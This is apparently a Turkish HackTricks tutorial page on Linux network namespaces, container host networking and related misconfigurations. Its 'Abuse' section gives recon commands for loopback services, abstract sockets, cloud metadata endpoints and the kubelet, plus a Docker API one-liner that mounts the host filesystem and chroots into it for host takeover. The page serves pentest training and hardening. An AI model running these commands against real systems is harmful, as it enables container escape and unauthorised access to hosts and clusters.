# Ağ Namespace'i

{{#include ../../../../../banners/hacktricks-training.md}}

## Genel Bakış

Network namespace; interfaces, IP addresses, routing tables, ARP/neighbor state, firewall rules, sockets, UNIX-domain abstract socket namespace ve `/proc/net` gibi dosyaların içerikleri gibi network ile ilgili kaynakları izole eder.<sup>[[2]](#references)</sup> Bu nedenle bir container, host'un gerçek network stack'ine sahip olmadan kendi `eth0` interface'ine, kendi local route'larına ve kendi loopback device'ına sahipmiş gibi görünebilir.

Güvenlik açısından bu önemlidir; çünkü network isolation, port binding işleminden çok daha fazlasını ifade eder. Private network namespace, workload'un doğrudan neleri gözlemleyebileceğini veya yeniden yapılandırabileceğini sınırlar. Bu namespace host ile paylaşıldığında container aniden host listener'larını, host-local service'lerini, abstract AF_UNIX endpoint'lerini ve application'a açılması hiç amaçlanmamış network control point'lerini görünür hale getirebilir.

## Çalışma

Yeni oluşturulan bir network namespace, interface'ler kendisine bağlanana kadar boş veya neredeyse boş bir network ortamıyla başlar. Container runtime'ları daha sonra virtual interface'ler oluşturur veya bağlar, address'ler atar ve workload'un beklenen connectivity'ye sahip olması için route'ları yapılandırır. Bridge tabanlı deployment'larda bu genellikle container'ın host bridge'ine bağlı, veth destekli bir interface görmesi anlamına gelir. Kubernetes'te CNI plugin'leri, Pod networking için eşdeğer kurulumu gerçekleştirir.

Bu architecture, `--network=host` veya `hostNetwork: true` ayarının neden bu kadar büyük bir değişiklik olduğunu açıklar. Workload, hazırlanmış private bir network stack almak yerine doğrudan host'un gerçek network stack'ine katılır.

## Lab

Şuna benzer bir komutla neredeyse boş bir network namespace görebilirsiniz:
```bash
sudo unshare --net --fork bash
ip addr
ip route
```
Ayrıca normal ve host-networked container'ları şu şekilde karşılaştırabilirsiniz:
```bash
docker run --rm debian:stable-slim sh -c 'ip addr || ifconfig'
docker run --rm --network=host debian:stable-slim sh -c 'ss -lntp | head'
```
Host-networked container artık kendi izole socket ve interface görünümüne sahip değildir. İşlemin hangi capabilities değerlerine sahip olduğunu sormadan önce bile, yalnızca bu değişiklik oldukça önemlidir.

## Runtime Kullanımı

Docker ve Podman, aksi şekilde yapılandırılmadıkça normalde her container için özel bir network namespace oluşturur. Kubernetes genellikle her Pod'a, o Pod içindeki container'lar arasında paylaşılan ancak host'tan ayrı olan kendi network namespace'ini verir. Bu, `127.0.0.1` adresinin genellikle container-local değil, Pod-local olduğu anlamına gelir: yalnızca localhost'a bağlı bir listener, genellikle sidecar'ları ve kardeş container'ları tarafından erişilebilir. Incus/LXC sistemleri de zengin network-namespace tabanlı izolasyon sağlar ve çoğu zaman daha geniş çeşitlilikte virtual networking kurulumu sunar.

Ortak ilke, private networking'in varsayılan izolasyon sınırı, host networking'in ise bu sınırdan açıkça vazgeçme seçeneği olmasıdır.

## Yanlış Yapılandırmalar

En önemli yanlış yapılandırma, host network namespace'ini paylaşmaktır. Bu bazen performance, low-level monitoring veya kolaylık amacıyla yapılır, ancak container'lar için kullanılabilen en temiz sınırlardan birini kaldırır. Host-local listener'lara daha doğrudan erişilebilir hâle gelir, yalnızca localhost'a bağlı servisler erişilebilir olabilir ve `CAP_NET_ADMIN` veya `CAP_NET_RAW` gibi capabilities çok daha tehlikeli hâle gelir; çünkü bunların etkinleştirdiği işlemler artık host'un kendi network ortamına uygulanır.

Bir diğer sorun, network namespace private olsa bile network-related capabilities değerlerinin gereğinden fazla verilmesidir. Private namespace yardımcı olur, ancak raw socket'leri veya gelişmiş network control işlemlerini zararsız hâle getirmez.

Kubernetes'te `hostNetwork: true`, Pod-level network segmentation'a ne kadar güvenebileceğinizi de değiştirir. Kubernetes, birçok network plugin'inin `podSelector` / `namespaceSelector` eşleştirmesi için `hostNetwork` Pod trafiğini düzgün şekilde ayırt edemediğini ve bu nedenle bu trafiği normal node trafiği olarak değerlendirdiğini belirtir.<sup>[[1]](#references)</sup> Bir attacker açısından bu, ele geçirilmiş bir `hostNetwork` workload'un çoğu zaman overlay-network workload'larıyla aynı policy varsayımlarıyla kısıtlanan normal bir Pod yerine, node-level network foothold olarak değerlendirilmesi gerektiği anlamına gelir.

## Abuse

İzolasyonun zayıf olduğu kurulumlarda attacker'lar host üzerinde listening yapan servisleri inceleyebilir, yalnızca loopback'e bağlı management endpoint'lerine erişebilir, tam olarak hangi capabilities değerlerinin ve ortamın mevcut olduğuna bağlı olarak trafiği sniff edebilir veya trafiğe müdahale edebilir ya da `CAP_NET_ADMIN` mevcutsa routing ve firewall durumunu yeniden yapılandırabilir. Bir cluster'da bu durum lateral movement ve control-plane reconnaissance işlemlerini de kolaylaştırabilir.

Host networking'den şüpheleniyorsanız, görünen interface'lerin ve listener'ların izole bir container network'üne değil host'a ait olduğunu doğrulayarak başlayın:
```bash
ip addr
ip route
ss -lntup | head -n 50
```
Yalnızca loopback üzerinden çalışan servisler genellikle ilk ilgi çekici keşiftir:
```bash
ss -lntp | grep '127.0.0.1'
curl -s http://127.0.0.1:2375/version 2>/dev/null
curl -sk https://127.0.0.1:2376/version 2>/dev/null
```
Abstract UNIX sockets, TCP/UDP listener'ları gibi görünmedikleri ve `/run` altında dosya sistemi yolları olarak mevcut olmayabildikleri için kolayca gözden kaçan bir diğer hedeftir; çünkü network namespace kapsamındadırlar. Bu nedenle host network kullanan bir container, container'a hiç bind-mount edilmemiş host'a özel control channel'lara erişimi devralabilir:
```bash
ss -xap 2>/dev/null | head -n 50
grep -a '@' /proc/net/unix 2>/dev/null | head -n 50
```
Tarihsel bir örnek `containerd-shim` abstract-socket exposure bug'ıydı, ancak daha geniş ders belirli CVE'den daha önemlidir: bir workload host network namespace'e katıldığında, abstract AF_UNIX services de attack surface'in parçası olur.<sup>[[3]](#references)</sup> Bu socket'ler runtime ile ilişkili veya administrative görünüyorsa, [Runtime API And Daemon Exposure](../../runtime-api-and-daemon-exposure.md) bölümüne pivot edin.

Network capabilities mevcutsa, workload'un görünür stack'i inceleyip değiştirebildiğini test edin:
```bash
capsh --print | grep -E 'cap_net_admin|cap_net_raw'
iptables -S 2>/dev/null || nft list ruleset 2>/dev/null
ip link show
```
Modern kernel’lerde, host networking ve `CAP_NET_ADMIN`, basit `iptables` / `nftables` değişikliklerinin ötesinde packet path’i de açığa çıkarabilir. `tc` qdiscs ve filters da namespace-scoped olduğundan, paylaşılan bir host network namespace’inde container’ın görebildiği host interfaces üzerinde uygulanırlar. Ayrıca `CAP_BPF` mevcutsa, TC ve XDP loaders gibi network-related eBPF programs da önem kazanır:<sup>[[4]](#references)</sup>
```bash
capsh --print | grep -E 'cap_net_admin|cap_net_raw|cap_bpf'
for i in $(ls /sys/class/net 2>/dev/null); do
echo "== $i =="
tc qdisc show dev "$i" 2>/dev/null
tc filter show dev "$i" ingress 2>/dev/null
tc filter show dev "$i" egress 2>/dev/null
done
bpftool net 2>/dev/null
```
Bu önemlidir; çünkü bir attacker trafiği yalnızca firewall kurallarını yeniden yazarak değil, host arayüzü düzeyinde mirror edebilir, redirect edebilir, shape edebilir veya drop edebilir. Private network namespace içinde bu eylemler container görünümüyle sınırlıdır; paylaşılan host namespace içinde ise host'u etkiler hâle gelir.

Cluster veya cloud ortamlarında host networking, metadata ve control-plane'e komşu servisler için hızlı bir local recon yapılmasını da haklı çıkarır:
```bash
for u in \
http://169.254.169.254/latest/meta-data/ \
http://100.100.100.200/latest/meta-data/ \
http://127.0.0.1:10250/pods; do
curl -m 2 -s "$u" 2>/dev/null | head
done
```
Kubernetes'te, multi-container bir Pod'daki **herhangi** bir container'ın ele geçirilmesinin, kardeş container'lar ve sidecar'lar tarafından açılan localhost listener'larına da erişim sağladığını unutmayın; bunun nedeni tüm Pod'un tek bir network namespace paylaşmasıdır. Bu durum, admin veya debug arayüzleri cluster genelinde değil, kasıtlı olarak Pod içi olacak şekilde yapılandırılan service-mesh, observability ve yardımcı container'lar için özellikle önemlidir:
```bash
ss -lntup | grep -E '127.0.0.1|::1'
curl -s http://127.0.0.1:15000/server_info 2>/dev/null | head
curl -s http://127.0.0.1:15000/config_dump 2>/dev/null | head
```
"localhost'a bağlı" ifadesini **Pod'a özel** olarak değerlendirin, **container'a özel** olarak değil. Pod içindeki bir container ele geçirildikten sonra bu varsayım geçerliliğini yitirir.

### Tam Örnek: Host Networking + Local Runtime / Kubelet Access

Host networking otomatik olarak host root erişimi sağlamaz, ancak genellikle yalnızca node'un kendisinden erişilmesi amaçlanan servisleri açığa çıkarır. Bu servislerden biri zayıf şekilde korunuyorsa host networking, doğrudan bir privilege-escalation yolu hâline gelir.

localhost üzerindeki Docker API:
```bash
curl -s http://127.0.0.1:2375/version 2>/dev/null
docker -H tcp://127.0.0.1:2375 run --rm -it -v /:/mnt ubuntu chroot /mnt bash 2>/dev/null
```
localhost üzerindeki Kubelet:
```bash
curl -k https://127.0.0.1:10250/pods 2>/dev/null | head
curl -k https://127.0.0.1:10250/runningpods/ 2>/dev/null | head
```
Etki:

- uygun koruma olmadan bir local runtime API açığa çıkarsa doğrudan host compromise
- kubelet veya local agents erişilebilirse cluster keşfi veya lateral movement
- `CAP_NET_ADMIN` ile birleştirildiğinde traffic manipulation veya denial of service

## Kontroller

Bu kontrollerin amacı, process'in private bir network stack'e sahip olup olmadığını, hangi route'ların ve listener'ların görünür olduğunu ve capability'leri test etmeden önce network görünümünün host benzeri görünüp görünmediğini öğrenmektir.
```bash
readlink /proc/self/ns/net   # Current network namespace identifier
readlink /proc/1/ns/net      # Compare with PID 1 in the current container / pod
lsns -t net 2>/dev/null      # Reachable network namespaces from this view
ip netns identify $$ 2>/dev/null
ip addr                      # Visible interfaces and addresses
ip route                     # Routing table
ss -lntup                    # Listening TCP/UDP sockets with process info
ss -xap                      # UNIX sockets, including abstract namespace entries
grep -a '@' /proc/net/unix   # Quick view of abstract AF_UNIX sockets in this netns
```
Burada ilginç olanlar:

- `/proc/self/ns/net` ve `/proc/1/ns/net` zaten host benzeri görünüyorsa container, host network namespace'ini veya başka bir private olmayan namespace'i paylaşıyor olabilir.
- Shell zaten adlandırılmış veya persistent bir namespace'in içindeyse ve bunu host tarafındaki `/run/netns` nesneleriyle ilişkilendirmek istiyorsanız, `lsns -t net` ve `ip netns identify` kullanışlıdır.
- `ss -lntup`, loopback-only listener'ları ve yerel management endpoint'lerini ortaya çıkardığı için özellikle değerlidir. `ss -xap` ve `/proc/net/unix`, normal filesystem socket aramalarının gözden kaçırdığı abstract-socket görünümünü ekler.
- `CAP_NET_ADMIN`, `CAP_NET_RAW` veya `CAP_BPF` mevcutsa route'lar, interface adları, firewall context'i, `tc` state'i ve eBPF attachment'ları çok daha önemli hale gelir.
- Kubernetes'te `hostNetwork` kullanan bir Pod'da service-name resolution başarısız oluyorsa bunun nedeni, service'in mevcut olmaması değil, Pod'un `dnsPolicy: ClusterFirstWithHostNet` kullanmaması olabilir.
- Multi-container Pod'larda localhost listener'ları tüm Pod network namespace'ine aittir; bu nedenle loopback-only bir portun compromised container'dan erişilemez olduğunu varsaymadan önce sidecar'ları ve sibling container'ları kontrol edin.

Bir container'ı incelerken network namespace'ini her zaman capability set'iyle birlikte değerlendirin. Host networking ile güçlü network capability'leri, bridge networking ile dar bir default capability set'inden çok farklı bir posture oluşturur.

## Referanslar

- [1] [Kubernetes NetworkPolicy ve `hostNetwork` caveat'leri](https://kubernetes.io/docs/concepts/services-networking/network-policies/)
- [2] [Linux `network_namespaces(7)` ve abstract UNIX socket isolation](https://man7.org/linux/man-pages/man7/network_namespaces.7.html)
- [3] [containerd advisory: host-network container'larına açılan abstract Unix domain socket'leri](https://github.com/containerd/containerd/security/advisories/GHSA-36xw-fx78-c5r4)
- [4] [Network-related eBPF program'ları için eBPF token ve capability gereksinimleri](https://docs.ebpf.io/linux/concepts/token/)

{{#include ../../../../../banners/hacktricks-training.md}}
